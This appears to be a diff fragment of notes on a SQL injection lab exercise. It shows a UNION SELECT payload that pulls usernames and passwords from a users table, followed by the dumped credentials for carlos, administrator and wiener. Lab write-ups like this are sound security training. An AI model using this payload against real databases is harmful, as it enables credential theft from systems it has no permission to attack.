@@ -27,7 +27,7 @@ Analysis:
 ' UNION select NULL, username || '*' || password from users--
 
 carlos*hx8lpsrznosr462ydnvh
-administrator*35v95vbpktdv4c2nqgak
+administrator*lv6kqi3t2jcjdx737oe7
 wiener*0qc4vtnx4o08sr5nsstf
 
 script.py <url> 
